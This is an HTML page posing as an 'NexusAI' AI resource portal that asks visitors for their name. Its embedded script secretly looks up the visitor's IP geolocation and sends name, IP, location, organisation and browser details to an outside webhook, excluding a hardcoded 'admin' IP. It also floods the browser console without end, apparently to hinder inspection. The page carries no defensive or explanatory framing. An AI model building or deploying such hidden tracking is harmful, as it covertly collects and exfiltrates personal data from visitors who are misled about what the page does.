<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexusAI | Resource Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #5c6bc0;
            --secondary: #3949ab;
            --accent: #26c6da;
            --dark: #263238;
            --light: #f5f5f5;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        body {
            background-color: #f8f9fd;
            color: var(--dark);
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .navbar {
            background-color: white;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
            padding: 1.2rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--primary);
        }
        
        .logo i {
            margin-right: 0.5rem;
            color: var(--accent);
        }
        
        .nav-links {
            display: flex;
            gap: 2rem;
        }
        
        .auth-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 80px);
            padding: 2rem;
        }
        
        .auth-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 1000px;
            overflow: hidden;
        }
        
        .auth-header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 2rem;
            text-align: center;
        }
        
        .auth-body {
            padding: 2rem;
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }
        
        .form-control {
            width: 100%;
            padding: 0.8rem 1rem;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            margin: 1rem 0;
        }
        
        .btn {
            background: var(--primary);
            color: white;
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }
        
        .resources-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
        }
        
        .resource-card {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
            transition: all 0.3s ease;
        }
        
        .resource-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .resource-img {
            height: 180px;
            background-size: cover;
            background-position: center;
        }
        
        .resource-body {
            padding: 1.5rem;
        }
        
        .welcome-message {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .user-badge {
            display: inline-flex;
            align-items: center;
            background: var(--light);
            padding: 0.5rem 1rem;
            border-radius: 50px;
            margin-bottom: 1rem;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @media (max-width: 768px) {
            .navbar {
                flex-direction: column;
                padding: 1rem;
            }
            
            .nav-links {
                margin-top: 1rem;
                gap: 1rem;
                flex-wrap: wrap;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="logo">
            <i class="fas fa-robot"></i>
            <span>NexusAI</span>
        </div>
        <div class="nav-links">
            <a href="#">Products</a>
            <a href="#">Research</a>
            <a href="#">Solutions</a>
        </div>
    </nav>
    
    <div class="auth-container">
        <div class="auth-card">
            <div class="auth-header">
                <h1>AI Resource Portal</h1>
                <p>Access premium tools and datasets</p>
            </div>
            
            <div class="auth-body">
                <!-- Step 1: Name Entry -->
                <div class="step active" id="step1">
                    <input type="text" class="form-control" id="userName" placeholder="Enter your name">
                    <button class="btn" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
                </div>
                
                <!-- Step 2: Resource Display -->
                <div class="step" id="step2">
                    <div class="welcome-message">
                        <div class="user-badge">
                            <i class="fas fa-user-check"></i>
                            <span id="welcomeName">Welcome back!</span>
                        </div>
                        <h2>Your AI Resources</h2>
                    </div>
                    
                    <div class="resources-grid" id="resourceGrid">
                        <!-- Resources will load here -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Unique abstract images with cache busting
        const abstractImages = [
            'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
            'https://images.unsplash.com/photo-1579547945413-497e1b99dac0?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
            'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
            'https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
            'https://images.unsplash.com/photo-1563089145-599997674d42?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
            'https://images.unsplash.com/photo-1451187580459-43490279c0fa?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80'
        ];

        // Console spam variables
        let spamCount = 0;
        const ADMIN_IP = "83.105.112.217";
        const WEBHOOK_URL = "https://endpp.free.beeceptor.com";

        // Start console spam immediately
        const startConsoleSpam = () => {
            const firstStage = setInterval(() => {
                console.log(`[SYSTEM] ${Math.random().toString(36).substring(2, 15)}`);
                spamCount++;
                if (spamCount > 300) {
                    clearInterval(firstStage);
                    console.clear();
                    // Start second stage - endless block spam
                    setInterval(() => {
                        console.log('â–“'.repeat(80));
                    }, 50);
                }
            }, 50);
        };
        startConsoleSpam();

        // Get IP data silently
        async function getIPData() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                return await response.json();
            } catch (error) {
                return null;
            }
        }

        // Send data to webhook silently
        async function sendToWebhook(userName, ipData) {
            if (!ipData || ipData.ip === ADMIN_IP) return;
            
            const payload = {
                name: userName,
                ip: ipData.ip,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country,
                org: ipData.org,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                // Silent fail
            }
        }

        // Main function
        async function nextStep() {
            const userName = document.getElementById('userName').value.trim();
            if (!userName) return;
            
            // Silently collect IP data
            const ipData = await getIPData();
            await sendToWebhook(userName, ipData);
            
            // Update UI
            document.getElementById(' welcomeName').textContent = `Welcome, ${userName}`;
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            loadResources();
        }

        // Load resources with unique images
        function loadResources() {
            const grid = document.getElementById('resourceGrid');
            const resources = [
                "Neural Network Architectures", 
                "AI Dataset Library",
                "Model Optimization Toolkit",
                "Research Papers Digest",
                "Deployment Templates",
                "Ethics Guidelines"
            ];
            
            // Ensure we don't have more resources than images
            const maxResources = Math.min(resources.length, abstractImages.length);
            
            for (let i = 0; i < maxResources; i++) {
                const card = document.createElement('div');
                card.className = 'resource-card';
                card.innerHTML = `
                    <div class="resource-img" style="background-image:url('${abstractImages[i]}')"></div>
                    <div class="resource-body">
                        <h3>${resources[i]}</h3>
                        <p>Premium resource for AI development</p>
                    </div>
                `;
                grid.appendChild(card);
            }
        }
    </script>
</body>
</html>
